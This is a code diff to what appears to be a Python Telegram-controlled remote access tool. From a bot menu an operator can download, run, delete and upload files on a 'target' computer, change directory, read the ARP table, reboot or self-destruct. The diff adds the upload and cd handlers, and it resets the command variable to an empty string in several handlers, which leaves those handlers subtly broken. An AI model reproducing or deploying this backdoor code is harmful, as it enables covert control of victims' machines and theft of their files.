@@ -71,6 +71,7 @@ def on_chat_message(msg):
         [InlineKeyboardButton(text='Self_Destruct', callback_data='self_destruct')],
         [InlineKeyboardButton(text='arp: Returns ARP Table', callback_data='arp')],
         [InlineKeyboardButton(text='Reboot the bot', callback_data='reboot')],
+        [InlineKeyboardButton(text='Upload', callback_data='upload')],
         [InlineKeyboardButton(text='to: <target_computer>, [other_target_computer]', callback_data='to')]
     ])
     bot.sendMessage(chat_id, 'Buttons only please', reply_markup=keyboard)
@@ -103,6 +104,7 @@ def on_callback_query(msg):
             response += line
         bot.sendMessage(from_id, response)
     elif query_data == 'delete':
+        command = ''
         command = command.replace('/delete', '')
         path_file = command.strip()
         try:
@@ -123,6 +125,7 @@ def on_callback_query(msg):
                     response = 'File not found'
                     bot.sendMessage(from_id, response)
     elif query_data == 'download':
+        command = ''
         bot.sendChatAction(from_id, 'typing')
         path_file = command.replace('/download', '')
         path_file = path_file[1:]
@@ -282,6 +285,7 @@ def on_callback_query(msg):
             response += line
         bot.sendMessage(from_id, response)
     elif query_data == 'run':
+        command = ''
         bot.sendChatAction(from_id, 'typing')
         path_file = command.replace('/run', '')
         path_file = path_file[1:]
@@ -332,7 +336,17 @@ def on_callback_query(msg):
         response = 'Rebooting, please wait'
         bot.sendMessage(from_id, response)
 
-    else:  # Upload a file to target
+    elif query_data == 'cd':
+        command = ''
+        command = command.replace('/cd ', '')
+        try:
+            os.chdir(command)
+            response = os.getcwd() + '>'
+            bot.sendMessage(from_id, response)
+        except:
+            response = 'No subfolder matching ' + command
+            bot.sendMessage(from_id, response)
+    elif query_data == 'upload':  # Upload a file to target
         file_name = ''
         file_id = None
         if 'document' in msg:
@@ -387,8 +401,8 @@ with open(log_file, "a") as writing:
     writing.write(user + " Log: " + strftime("%b %d@%H:%M") + "\n\n")
 
 # REPLACE THE LINE BELOW WITH THE TOKEN OF THE BOT YOU GENERATED!
-token = '1111111111:11111111111111111111111111111'  # you can set your environment variable as well
-known_ids = '29951105'
+token = '11111111:1111111111111111111111111111111'  # you can set your environment variable as well
+known_ids = '11111111'
 bot = telepot.Bot(token)
 # bot.message_loop(handle)
 bot.message_loop({'chat': on_chat_message,
